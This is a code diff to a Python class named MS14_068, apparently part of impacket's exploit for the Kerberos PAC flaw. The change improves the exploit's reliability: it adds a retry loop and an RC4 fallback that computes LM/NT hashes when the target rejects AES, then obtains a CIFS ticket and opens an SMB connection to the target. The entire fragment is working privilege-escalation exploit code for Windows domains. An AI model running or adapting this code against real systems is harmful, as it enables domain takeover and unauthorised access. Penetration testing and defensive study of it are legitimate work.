@@ -983,52 +983,68 @@ class MS14_068():
         self.__domainSid, self.__rid = self.getUserSID()
 
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
-        # So, we have the TGT, now extract the new session key and finish
-        asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+        while True: 
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
+            # So, we have the TGT, now extract the new session key and finish
+            asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
-        # If the cypher in use != RC4 there's gotta be a salt for us to use
-        salt = ''
-        if asRep['padata']:
-            for pa in asRep['padata']:
-                if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
-                    etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
-                    enctype = etype2['etype']
-                    salt = str(etype2['salt']) 
+            # If the cypher in use != RC4 there's gotta be a salt for us to use
+            salt = ''
+            if asRep['padata']:
+                for pa in asRep['padata']:
+                    if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                        etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                        enctype = etype2['etype']
+                        salt = str(etype2['salt']) 
 
-        cipherText = asRep['enc-part']['cipher']
+            cipherText = asRep['enc-part']['cipher']
 
-        # Key Usage 3
-        # AS-REP encrypted part (includes TGS session key or
-        # application session key), encrypted with the client key
-        # (Section 5.4.2)
-        if self.__nthash != '':
-            key = Key(cipher.enctype,self.__nthash)
-        else:
-            key = cipher.string_to_key(self.__password, salt, None)
+            # Key Usage 3
+            # AS-REP encrypted part (includes TGS session key or
+            # application session key), encrypted with the client key
+            # (Section 5.4.2)
+            if self.__nthash != '':
+                key = Key(cipher.enctype,self.__nthash)
+            else:
+                key = cipher.string_to_key(self.__password, salt, None)
 
-        plainText = cipher.decrypt(key, 3, str(cipherText))
-        encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
-        authTime = encASRepPart['authtime']
+            plainText = cipher.decrypt(key, 3, str(cipherText))
+            encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
+            authTime = encASRepPart['authtime']
 
-        serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
+            serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
 
-        if self.__writeTGT is not None:
-            from impacket.krb5.ccache import CCache
-            ccache = CCache()
-            ccache.fromTGS(tgs, oldSessionKey, sessionKey)
-            ccache.saveFile(self.__writeTGT)
-
-        # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
-        serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
-      
+            # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
+            serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            try:
+                tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
+            except KerberosError, e:
+                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                    # We might face this if the target does not support AES (most probably
+                    # Windows XP). So, if that's the case we'll force using RC4 by converting
+                    # the password to lm/nt hashes and hope for the best. If that's already
+                    # done, byebye.
+                    if self.__lmhash is '' and self.__nthash is '':
+                        from impacket.ntlm import compute_lmhash, compute_nthash
+                        self.__lmhash = compute_lmhash(self.__password) 
+                        self.__nthash = compute_nthash(self.__password) 
+                    else:
+                        raise e
+            else:
+                # Everything went well, let's save the ticket if asked and leave
+                if self.__writeTGT is not None:
+                    from impacket.krb5.ccache import CCache
+                    ccache = CCache()
+                    ccache.fromTGS(tgs, oldSessionKey, sessionKey)
+                    ccache.saveFile(self.__writeTGT)
+                break
+                 
         TGS = {}
-        TGS['KDC_REP'] = tgs
+        TGS['KDC_REP'] = tgsCIFS
         TGS['cipher'] = cipher
-        TGS['oldSessionKey'] = oldSessionKey
-        TGS['sessionKey'] = sessionKey
+        TGS['oldSessionKey'] = oldSessionKeyCIFS
+        TGS['sessionKey'] = sessionKeyCIFS
 
         from impacket.smbconnection import SMBConnection
         s = SMBConnection('*SMBSERVER', self.__target)
@@ -1061,7 +1077,7 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5 import transport
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
-    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS
+    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
     from impacket.krb5.asn1 import AS_REP, AS_REQ, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, EncTGSRepPart, ETYPE_INFO2_ENTRY
     from impacket.krb5.crypto import _RC4, Key
     from impacket.dcerpc.v5.ndr import NDRULONG
